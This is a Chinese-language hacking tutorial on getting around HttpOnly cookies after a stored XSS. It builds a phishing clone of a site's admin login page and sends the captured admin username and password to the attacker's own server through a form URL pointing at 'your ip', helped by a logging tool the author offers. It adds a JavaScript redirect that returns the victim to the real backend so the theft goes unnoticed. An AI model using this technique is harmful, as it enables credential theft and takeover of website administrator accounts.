**0X01 前言**

相信很多人都遇到过，好不容易挖到了一个储存型xss，本想着拿着打到的cookie登陆进管理员的后台，结果网站开了httponly，看着xss平台上cookie那栏白花花的中充满的无奈与绝望，今天就给大家带来一个突破httponly的简单的小姿势。

  

**0X02 什么是httponly**

首先还是先来看一下百度上的解释

  

如果您在cookie中设置了HttpOnly属性，那么通过js脚本将无法读取到cookie信息，这样能有效的防止XSS攻击

  

通过百度上的介绍我们可以了解到，httponly是一种防御xss攻击的一种安全策略，那么开启了httponly真的能有效防御xss攻击吗？下面我就来给大家简单分享一个小思路，来突破httponly  

  

**0X03 思路**

xss漏洞的本质其实是可以在被害者的浏览器上执行任意想执行的js，httponly既然是禁止js获取cookie，那么我们就换一个思路。想进入管理员的后台可以通过cookie进入，当然也一定可以通过账号和密码进入。既然httponly开启了禁止我们通过js获取完整的cookie，那么我们就只能退一步了，通过js获取他的明文账号密码。

****0X04 实现方法****

首先我们还是一发xss的常规钓cookie的payload怼进去，打回的结果发现没有cookie，但是却可以看到来路域名，也就是说如果这个xss是从前台打进后台的漏洞，xss平台收到的结果已经将管理员的后台地址泄露了，这样子我们就可以看到管理员后台登陆界面的样子了。  

  

我们先进入管理员的登陆界面，然后右键保存源代码，将他的前端脱下来，搭建我们的钓鱼页面，首先要改下他的登陆前端的form标签登陆接口，接口指向我们的钓鱼接口，这里为了兄弟们自己测试时方便，我简单写了个小工具来帮助大家测试，大家可以自行下载测试。  

  

![](../Images/b61255a2ab030c1146d520fa6c4a1db2.png)

  

这里如果用我写的小工具的话就是将form标签的接口改到http://你的ip/index.html?username=xxx&password=xxx，这么改完登陆提交接口之后单机钓鱼页登陆，我的小工具就会将账号密码记录下来  

  

![](../Images/97fb7f35af45f4f98c99c7058ac1936e.png)

  

![](../Images/5e91c6933561c48184642350252dd0c3.png)

  

这样子我们就通过钓鱼的方式得到管理员的明文账号密码了，为了不引起管理员怀疑，我们可以截获他的账号密码后再给他的页面跳回管理员的后台，比如说他的后台地址http://www.baidu.com/，下面是具体实现代码  

  

*   
*   
*   

```
<script type="text/javascript">　　window.location.href="https://www.baidu.com";</script>
```

2.  一个location让管理员进入我们的钓鱼页
    
3.  在我们截获到明文密码后，一个locaion再跳回他的后台
    
4.  拿着我们钓鱼钓到的密码登陆
